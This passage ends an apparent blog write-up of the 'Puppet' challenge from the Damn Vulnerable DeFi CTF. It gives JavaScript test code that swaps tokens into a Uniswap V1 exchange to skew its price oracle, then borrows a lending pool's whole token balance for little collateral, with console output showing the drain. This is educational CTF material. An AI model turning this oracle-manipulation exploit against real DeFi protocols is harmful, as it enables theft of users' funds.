+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">provider</span> = <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">function</span> <span style="color:#000">formatOutput</span>(<span style="color:#000">val</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">return</span> <span style="color:#000">parseFloat</span>(<span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">formatEther</span>(<span style="color:#000">val</span>)).<span style="color:#000">toFixed</span>(<span style="color:#3af">3</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">async</span> <span style="color:#00f">function</span> <span style="color:#000">logData</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">let</span> <span style="color:#000">row1</span> = {
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;pool DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;pool ETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;attacker DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;attacker ETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;exchange DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;exchange ETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>))
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">let</span> <span style="color:#000">depositRequired</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">calculateDepositRequired</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">table</span>([<span style="color:#000">row1</span>])
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Deposit required to borrow </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> DVT: </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">depositRequired</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> ETH\n`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">tokenAmount</span> = <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;999.99&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">p</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">getEthToTokenInputPrice</span>(<span style="color:#000">tokenAmount</span>, { <span style="color:#000">gasLimit</span>: <span style="color:#3af">1e6</span> });
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Swapping </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">tokenAmount</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> DVT. Expecting to receive: </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">p</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> ETH`</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">approve</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>, <span style="color:#000">tokenAmount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">tokenToEthSwapInput</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">tokenAmount</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#3af">1</span>,
+</span></span><span style="display:flex;"><span>            (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">getBlock</span>(<span style="color:#5a2">&#39;latest&#39;</span>)).<span style="color:#000">timestamp</span> * <span style="color:#3af">2</span>,
+</span></span><span style="display:flex;"><span>            { <span style="color:#000">gasLimit</span>: <span style="color:#3af">1e6</span> }
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">depositRequired</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">calculateDepositRequired</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Borrowed </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> DVT`</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">borrow</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">value</span>: <span style="color:#000">depositRequired</span>
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>I added some log information to keep track of the different balances. The following is the output obtained from running the above code:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌─────────┬──────────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT   │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
+</span></span><span style="display:flex;"><span>├─────────┼──────────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;100000.000&#39;</span> │ <span style="color:#5a2">&#39;0.000&#39;</span>  │  <span style="color:#5a2">&#39;1000.000&#39;</span>  │   <span style="color:#5a2">&#39;25.000&#39;</span>   │   <span style="color:#5a2">&#39;10.000&#39;</span>   │   <span style="color:#5a2">&#39;10.000&#39;</span>   │
+</span></span><span style="display:flex;"><span>└─────────┴──────────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 100000.000 DVT: 200000.000 ETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Swapping 999.990 DVT. Expecting to receive: 9.901 ETH
+</span></span><span style="display:flex;"><span>┌─────────┬──────────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT   │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
+</span></span><span style="display:flex;"><span>├─────────┼──────────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;100000.000&#39;</span> │ <span style="color:#5a2">&#39;0.000&#39;</span>  │   <span style="color:#5a2">&#39;0.010&#39;</span>    │   <span style="color:#5a2">&#39;34.901&#39;</span>   │  <span style="color:#5a2">&#39;1009.990&#39;</span>  │   <span style="color:#5a2">&#39;0.099&#39;</span>    │
+</span></span><span style="display:flex;"><span>└─────────┴──────────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 100000.000 DVT: 19.665 ETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Borrowed 100000.000 DVT
+</span></span><span style="display:flex;"><span>┌─────────┬──────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │ pool DVT │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
+</span></span><span style="display:flex;"><span>├─────────┼──────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;0.000&#39;</span>  │ <span style="color:#5a2">&#39;19.665&#39;</span> │ <span style="color:#5a2">&#39;100000.010&#39;</span> │   <span style="color:#5a2">&#39;15.236&#39;</span>   │  <span style="color:#5a2">&#39;1009.990&#39;</span>  │   <span style="color:#5a2">&#39;0.099&#39;</span>    │
+</span></span><span style="display:flex;"><span>└─────────┴──────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 100000.000 DVT: 19.665 ETH</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/puppet/puppet.challenge.js" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.uniswap.org/protocol/V1/reference/exchange" target="_blank" rel="noopener noreffer ">The Uniswap V1 Protocol</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 20, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/" data-title="Damn Vulnerable DeFi - Challenge #8 - Puppet" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/damnvulnerabledefi_07_compromised/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #7 - Compromised"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #7 - Compromised</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
